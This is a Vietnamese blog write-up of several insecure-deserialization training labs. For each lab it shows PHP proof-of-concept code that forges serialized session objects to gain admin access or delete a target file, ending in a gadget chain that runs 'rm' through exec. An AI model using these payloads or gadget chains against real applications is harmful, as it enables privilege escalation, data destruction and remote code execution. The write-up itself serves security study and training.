

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Insecure-deserialization-lab - l3mnt2010&#39;s Blog</title>
  <meta name="description" content="Insecure deserialization Lab: Modifying serialized objects   Đề bài yêu cầu như sau:
    Như ta thấy thì lab chứa lỗ hổng Insecure deserialization do đó dễ bị leo thang đặc quyền vào nhiệm vụ là ta đạt được quyền quản trị sau đó xóa carlos.
  Let&rsquo;s go bắt đầu bài lab nào:
  Đăng nhập với viewner:
    Quan sát thấy có chức năng đổi email người dùng.">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "l3mnt2010\u0027s Blog",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/insecure-deserialization-lab\/",
          "name": "Insecure deserialization lab"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "Insecure-deserialization-lab",
  "description" : "Insecure deserialization Lab: Modifying serialized objects   Đề bài yêu cầu như sau:\n    Như ta thấy thì lab chứa lỗ hổng Insecure deserialization do đó dễ bị leo thang đặc quyền vào nhiệm vụ là ta đạt được quyền quản trị sau đó xóa carlos.\n  Let\u0026rsquo;s go bắt đầu bài lab nào:\n  Đăng nhập với viewner:\n    Quan sát thấy có chức năng đổi email người dùng.",
  "inLanguage" : "en",
  "wordCount":  1746 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese, Deserialize" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/insecure-deserialization-lab\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Insecure-deserialization-lab" />
<meta property="og:description" content="Insecure deserialization Lab: Modifying serialized objects   Đề bài yêu cầu như sau:
    Như ta thấy thì lab chứa lỗ hổng Insecure deserialization do đó dễ bị leo thang đặc quyền vào nhiệm vụ là ta đạt được quyền quản trị sau đó xóa carlos.
  Let&rsquo;s go bắt đầu bài lab nào:
  Đăng nhập với viewner:
    Quan sát thấy có chức năng đổi email người dùng.">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/insecure-deserialization-lab/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="l3mnt2010&#39;s Blog" />

  <meta name="twitter:title" content="Insecure-deserialization-lab" />
  <meta name="twitter:description" content="Insecure deserialization Lab: Modifying serialized objects   Đề bài yêu cầu như sau:
    Như ta thấy thì lab chứa lỗ hổng Insecure deserialization do đó dễ bị leo thang đặc quyền vào nhiệm vụ là ta …">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="l3mnt2010&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">l3mnt2010&#39;s Blog</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Blog" href="https://l3mnt2010.github.io/">Blog</a>
            </li>
          
        
          
            <li>
              <a title="Write-ups" href="https://l3mnt2010.github.io/write-up/">Write-ups</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
            </li>
          
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="l3mnt2010&#39;s Blog" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="l3mnt2010&#39;s Blog" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="post-heading">
              
                <h1>Insecure-deserialization-lab</h1>
              
              
              
              
                <span class="post-meta">
  
  
  <i class="fas fa-calendar"></i>&nbsp;Posted on January 1, 0001
  
  
  
  
    
      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;
    
  
  
</span>


              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <!-- raw HTML omitted -->
<h1 id="insecure-deserialization">Insecure deserialization</h1>
<h2 id="lab-modifying-serialized-objects">Lab: Modifying serialized objects</h2>
<ul>
<li>
<p>Đề bài yêu cầu như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ryuOh7Y0T.png" alt="image"></p>
</li>
<li>
<p>Như ta thấy thì lab chứa lỗ hổng Insecure deserialization do đó dễ bị leo thang đặc quyền vào nhiệm vụ là ta đạt được quyền quản trị sau đó xóa carlos.</p>
</li>
<li>
<p>Let&rsquo;s go bắt đầu bài lab nào:</p>
</li>
<li>
<p>Đăng nhập với viewner:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rkFZa7KR6.png" alt="image"></p>
</li>
<li>
<p>Quan sát thấy có chức năng đổi email người dùng.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Hy4q67K0T.png" alt="image"></p>
</li>
<li>
<p>cơ bản thì không thấy gì nhưng mà để ý session:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Hy5367FR6.png" alt="image"></p>
</li>
<li>
<p>Server lại lưu phiên với serialize:&lt;</p>
</li>
</ul>
<pre><code>&lt;?php

$a= &quot;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d&quot;;

$a = base64_decode($a);

$b= unserialize($a);

print_r($b);

?&gt;

-&gt; __PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] =&gt; User
    [username] =&gt; wiener
    [admin] =&gt;
)
</code></pre><ul>
<li>
<p>Class chứa 2 thuộc tính là username và admin có vẻ đây là xét có phải admin hay không.</p>
</li>
<li>
<p>Bây giờ mình đánh cắp phiên <code>admin</code> bằng cách đổi admin thành <code>1</code>.</p>
</li>
</ul>
<pre><code>&lt;?php

class User {
   public  $username; 
   public  $admin;
   function __construct($username, $admin){
      $this-&gt;username = $username;
      $this-&gt;admin = $admin;
   }

}

$poc = new User(&quot;viewner&quot;, true);

$poc = serialize($poc);

echo base64_encode($poc);

// $a= &quot;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d&quot;;

// $a = base64_decode($a);

// $b= unserialize($a);

// print_r($b);

?&gt;

</code></pre><p><code>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=</code></p>
<ul>
<li>
<p><img src="https://hackmd.io/_uploads/Bycx7NF06.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ryYNmVKCa.png" alt="image"></p>
</li>
<li>
<p>Bây giờ thì xóa user <code>carlos</code> và solved bài lab:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/By4DmNY06.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/r1e_mEK0a.png" alt="image"></p>
</li>
</ul>
<h2 id="lab-modifying-serialized-data-types">Lab: Modifying serialized data types</h2>
<ul>
<li>
<p>Đề bài yêu cầu như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Bkuw4NtCa.png" alt="image"></p>
</li>
<li>
<p>Yêu cầu tương tự như bài trên là xóa <code>carlos</code> với tư cách quản trị viên.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Sk2FF4K06.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ryFnFVtCa.png" alt="image"></p>
</li>
</ul>
<pre><code>&lt;?php

// class User {
//    public  $username; 
//    public  $access_token;
//    function __construct($username, $access_token){
//       $this-&gt;username = $username;
//       $this-&gt;access_token = $admin;
//    }

// }

// $poc = new User(&quot;viewner&quot;, true);

// $poc = serialize($poc);

// echo base64_encode($poc);

$a= &quot;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJuNGF1ampocms1eHhyZzA0a3BrMmVzdXIzN3A0eWUzOCI7fQ==&quot;;

$a = base64_decode($a);

$b= unserialize($a);

print_r($b);

?&gt;

-----&gt;
__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] =&gt; User
    [username] =&gt; wiener
    [access_token] =&gt; n4aujjhrk5xxrg04kpk2esur37p4ye38
)

</code></pre><ul>
<li>ở đây khác với ở trên là check token thay vì boolean, nên mình sẽ thay <code>username</code> thành <code>administrator</code> nhưng đồng thời access-token được lose compare để mình sẽ khai khác type jugging.</li>
</ul>
<pre><code>&lt;?php

class User {
   public  $username; 
   public  $access_token;
   function __construct($username, $access_token){
      $this-&gt;username = $username;
      $this-&gt;access_token = $access_token;
   }

}

$poc = new User(&quot;administrator&quot;, 0);

$poc = serialize($poc);

echo base64_encode($poc);

// $a= &quot;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJuNGF1ampocms1eHhyZzA0a3BrMmVzdXIzN3A0eWUzOCI7fQ==&quot;;

// $a = base64_decode($a);

// $b= unserialize($a);

// print_r($b);

--&gt; Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
?&gt;
</code></pre><ul>
<li>
<p>Thay session và ta nhận được phiên admin</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/B14BNrKA6.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HJvwNrYRa.png" alt="image"></p>
</li>
<li>
<p>Truy cập admin và xóa <code>carlos</code> thui :-1:  hihi</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/H149ErtAa.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/SkQiVBY0T.png" alt="image"></p>
</li>
</ul>
<h2 id="lab-using-application-functionality-to-exploit-insecure-deserialization">Lab: Using application functionality to exploit insecure deserialization</h2>
<ul>
<li>
<p>Đề bài yêu cầu chúng ta như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HJye_rYRT.png" alt="image"></p>
</li>
<li>
<p>Có thể thấy bài lab yêu cầu chúng ta lợi dụng serialize để xóa file morale.txt nằm trong thư mục home của user carlos.</p>
</li>
<li>
<p>Bắt đầu thui nào:&gt;</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/S1e4tHKAT.png" alt="image"></p>
</li>
<li>
<p>Bài này có chức năng thay đổi email, upload avatar và xóa tài khoản bây giờ thử xóa thử xem nhưng ta bắt request nha:&gt;</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HJpYFHYAT.png" alt="image"></p>
</li>
<li>
<p>Khi mà xóa thì mình lại gửi 1 serial đã được base64 lên sever để xóa, lợi dụng thuộc tính avatar link để xóa dữ liệu lưu trữ trên sever nha.</p>
</li>
</ul>
<pre><code>&lt;?php


$a= &quot;Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d&quot;;

$a = base64_decode($a);

$b= unserialize($a);

print_r($b);

---&gt; 
__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] =&gt; User
    [username] =&gt; wiener
    [access_token] =&gt; ob4nfdfe5htvwuykpn0zykbvjh645uxw
    [avatar_link] =&gt; users/wiener/avatar
)

?&gt;
</code></pre><ul>
<li>Bây giờ ta sẽ tạo lại object User này.</li>
</ul>
<pre><code>&lt;?php

class User {
   public  $username; 
   public  $access_token;
   public $avatar_link;
   function __construct($username, $access_token,$avatar_link){
      $this-&gt;username = $username;
      $this-&gt;access_token = $access_token;
      $this-&gt;avatar_link = $avatar_link;
   }

}

$poc = new User(&quot;viewner&quot;, &quot; ob4nfdfe5htvwuykpn0zykbvjh645uxw&quot;, &quot;/home/carlos/morale.txt&quot;);

$poc = serialize($poc);

echo base64_encode($poc);

// $a= &quot;Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d&quot;;

// $a = base64_decode($a);

// $b= unserialize($a);

// print_r($b);

?&gt;
</code></pre><ul>
<li>
<p><code>Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9</code></p>
</li>
<li>
<p>Gửi session để delete và solved bài lab.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/SkTgjrYR6.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Byo2iHFRp.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HkBTjBFR6.png" alt="image"></p>
</li>
</ul>
<h2 id="lab-arbitrary-object-injection-in-php">Lab: Arbitrary object injection in PHP</h2>
<ul>
<li>
<p>Đề bài cho chúng ta như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ByV82HFAp.png" alt="image"></p>
</li>
<li>
<p>Yêu cầu vẫn là xóa file morale.txt từ carlos trên sever.</p>
</li>
<li>
<p>Bắt đầu bài lab thui.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/SJe32HY0p.png" alt="image"></p>
</li>
<li>
<p>Đăng nhập với viewner.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rJVzTrFAa.png" alt="image"></p>
</li>
<li>
<p>Phát hiện ra gợi ý lỗ hổng serialize object ở <code>/my-account</code></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HkEp6StCT.png" alt="image"></p>
</li>
<li>
<p>Nhưng mà ở đây khác bài trước là ta không tìm thấy cách để xóa luôn, giờ thì mình thử recon thêm.</p>
</li>
<li>
<p>Sau đó mình phát hiện ra có 1 file cũng được load là <code>/libs/CustomTemplate.php</code></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/r14jkLFCT.png" alt="image"></p>
</li>
<li>
<p>Nhưng mà khi get thì file này render ở sever side nên không thể đọc source lúc nào mình dùng trick ~ để đọc file backup và được lun:&gt;</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/BkGlxUt0T.png" alt="image"></p>
</li>
</ul>
<pre><code>
&lt;?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this-&gt;template_file_path = $template_file_path;
        $this-&gt;lock_file_path = $template_file_path . &quot;.lock&quot;;
    }

    private function isTemplateLocked() {
        return file_exists($this-&gt;lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this-&gt;template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this-&gt;lock_file_path, &quot;&quot;) === false) {
                throw new Exception(&quot;Could not write to &quot; . $this-&gt;lock_file_path);
            }
            if (file_put_contents($this-&gt;template_file_path, $template) === false) {
                throw new Exception(&quot;Could not write to &quot; . $this-&gt;template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this-&gt;lock_file_path)) {
            unlink($this-&gt;lock_file_path);
        }
    }
}

?&gt;
</code></pre><ul>
<li>
<p>Ta có thể thấy đây là 1 thư viện để hiển thị template chứa 2 tham số trong class CustomTeamplate, hàm __destruct() là một magic method sẽ được gọi khi đây là phương thức được xử lí các tác vụ cuối cùng khi một đối tượng bị hủy hoặc giải phóng bộ nhớ.</p>
</li>
<li>
<p>Vì vậy chúng ta có thể lợi dụng hàm này và hàm unlink để xóa file morale.txt từ carlos vì khi mà 1 đối tượng bị hủy thì sẽ gọi đến destruct</p>
</li>
<li>
<p>Triển khai:</p>
</li>
</ul>
<pre><code>&lt;?php

class User {
   public  $username; 
   public  $access_token;
   function __construct($username, $access_token){
      $this-&gt;username = $username;
      $this-&gt;access_token = $access_token;
   }

}

// $poc = new User(&quot;viewner&quot;, &quot; ob4nfdfe5htvwuykpn0zykbvjh645uxw&quot;, &quot;/home/carlos/morale.txt&quot;);

// $poc = serialize($poc);

// echo base64_encode($poc);

$a= &quot;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3bjYxYjFhMmphZWpoODZsbGxqaDc3NWo2eG9qNGdveCI7fQ%3d%3d&quot;;

$a = base64_decode($a);

$b= unserialize($a);

print_r($b);

?&gt;

---&gt; 
(
    [username] =&gt; wiener
    [access_token] =&gt; wn61b1a2jaejh86llljh775j6xoj4gox
)
</code></pre><ul>
<li>POC:</li>
</ul>
<pre><code>&lt;?php


class CustomTemplate {
    private $template_file_path;
    private $lock_file_path= &quot;/home/carlos/morale.txt&quot;;

    public function __construct($template_file_path) {
        $this-&gt;template_file_path = $template_file_path;
        $this-&gt;lock_file_path = $template_file_path . &quot;.lock&quot;;
    }

    private function isTemplateLocked() {
        return file_exists($this-&gt;lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this-&gt;template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this-&gt;lock_file_path, &quot;&quot;) === false) {
                throw new Exception(&quot;Could not write to &quot; . $this-&gt;lock_file_path);
            }
            if (file_put_contents($this-&gt;template_file_path, $template) === false) {
                throw new Exception(&quot;Could not write to &quot; . $this-&gt;template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this-&gt;lock_file_path)) {
            unlink($this-&gt;lock_file_path);
        }
    }
}


class User {
   public  $username; 
   public  $access_token;
   function __construct($username, $access_token){
      $this-&gt;username = $username;
      $this-&gt;access_token = $access_token;
   }

}

// $poc = new User(&quot;viewner&quot;, &quot; ob4nfdfe5htvwuykpn0zykbvjh645uxw&quot;);

$poc = new CustomTemplate(&quot;/home/carlos/morale.txt&quot;);


$poc = serialize($poc);

echo base64_encode($poc);

// $a= &quot;Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3bjYxYjFhMmphZWpoODZsbGxqaDc3NWo2eG9qNGdveCI7fQ%3d%3d&quot;;

// $a = base64_decode($a);

// $b= unserialize($a);

// print_r($b);

?&gt;
---&gt; TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzQ6IgBDdXN0b21UZW1wbGF0ZQB0ZW1wbGF0ZV9maWxlX3BhdGgiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IjtzOjMwOiIAQ3VzdG9tVGVtcGxhdGUAbG9ja19maWxlX3BhdGgiO3M6Mjg6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0LmxvY2siO30=
</code></pre><ul>
<li>
<p><img src="https://hackmd.io/_uploads/HkmMQ8tR6.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/ByTiQ8YRT.png" alt="image"></p>
</li>
<li>
<p>Mặc dù 500 nhưng mà khi server deserialize thì đã gọi hàm destruct và xóa file morale.txt rồi nên bài lab được solved:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/BkoJEIFAp.png" alt="image"></p>
</li>
</ul>
<h2 id="lab-developing-a-custom-gadget-chain-for-php-deserialization">Lab: Developing a custom gadget chain for PHP deserialization</h2>
<ul>
<li>
<p><img src="https://hackmd.io/_uploads/Sk5CfvFCp.png" alt="image"></p>
</li>
<li>
<p>Đề bài yêu cầu tận dụng lỗ hổng desirealize dẫn đến RCE để xóa file <code>morale.txt</code> trong thư mục home của carlos trên server.</p>
</li>
<li>
<p>Giao diện ta vào đầu tiên sẽ như thế này:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/Hy7SXvYRa.png" alt="image"></p>
</li>
<li>
<p>Bắt đầu bước recon ta sẽ đi khám phá tất cả những chức năng của bài lab:</p>
</li>
<li>
<p>Có thể thấy trang web vẫn chứa lỗ hổng insecure deserialize ở /my-account</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/B1opXwYCp.png" alt="image"></p>
</li>
<li>
<p>Nhưng mà vẫn chưa thấy class để chúng ta có thể khai thác để thực thi RCE.</p>
</li>
<li>
<p>Quan sát kỹ một tí trong target ta thấy</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/B1FbNPtRT.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/B16MEwKCp.png" alt="image"></p>
</li>
<li>
<p>Đây có vẻ là một file php nhưng mà render ở trên sever side cho nên ta không đọc được, sử dụng trick như bài trên để đọc được file backup của nó.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HkhUNvFR6.png" alt="image"></p>
</li>
</ul>
<pre><code>&lt;?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this-&gt;desc = new Description();
        $this-&gt;default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this-&gt;build_product();
    }

    public function __sleep() {
        return [&quot;default_desc_type&quot;, &quot;desc&quot;];
    }

    public function __wakeup() {
        $this-&gt;build_product();
    }

    private function build_product() {
        $this-&gt;product = new Product($this-&gt;default_desc_type, $this-&gt;desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this-&gt;desc = $desc-&gt;$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this-&gt;HTML_DESC = '&lt;p&gt;This product is &lt;blink&gt;SUPER&lt;/blink&gt; cool in html&lt;/p&gt;';
        $this-&gt;TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this-&gt;callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this-&gt;callback, $name);
    }
}

?&gt;
</code></pre><ul>
<li>CustomTemplate :</li>
</ul>
<ul>
<li>Ta có có thể thấy magic method <code>__construct</code> được gọi khi mà 1 đối tượng mới được khởi tạo từ <code>CustomTemplate</code></li>
<li>Nhận tham số mặc định là <code>$desc_type='HTML_DESC'</code> sau đó tạo một đối tượng mới từ <code>class Description</code> gán vào giá trị của <code>desc</code> trong class này, sau đó gọi đến phương thức <code>build_product</code> gán <code>product</code> bằng việc khởi tạo một đối tượng mới từ class <code>Product</code></li>
</ul>
<ul>
<li>DefaultMap :-1:</li>
</ul>
<ul>
<li>
<p>Chú ý đến class này có một thuộc tính private là <code>$callback</code> khi khởi tạo sẽ gán bằng giá trị truyền vào và có  magic method <code>__get()</code> sẽ gọi hàm <code>return call_user_func($this-&gt;callback, $name);</code> vì vậy nếu như ta control callback này là một hàm thực thi thì ta có thể RCE được.</p>
</li>
<li>
<p>Thêm một ý quan trọng là method <code>__get()</code> sẽ được gọi khi mà một đối tượng gọi 1 phương thức không tồn tại hoặc không thể sử dụng của nó.</p>
</li>
<li>
<p>Từ các phân tích trên thì mình có thể xây dựng được POC như sau:</p>
</li>
</ul>
<pre><code>&lt;?php

class CustomTemplate {
                                        public $default_desc_type;
                                        public $desc;
                                    
                                    }

class DefaultMap {
                                        public $callback;
                                    
                                        public function __construct($callback) {
                                            $this-&gt;callback = $callback;
                                        }
                                    
                                        public function __get($name) {
                                            return call_user_func($this-&gt;callback, $name);
                                        }
                                    }

$b = new DefaultMap(&quot;exec&quot;);

$a = new CustomTemplate();

$a-&gt;default_desc_type=&quot;rm /home/carlos/morale.txt&quot;;

$a-&gt;desc = $b;

$poc = serialize($a);

echo base64_encode($poc);

?&gt;

- ![image](https://hackmd.io/_uploads/HJVOBl5Ra.png)


</code></pre><ul>
<li>
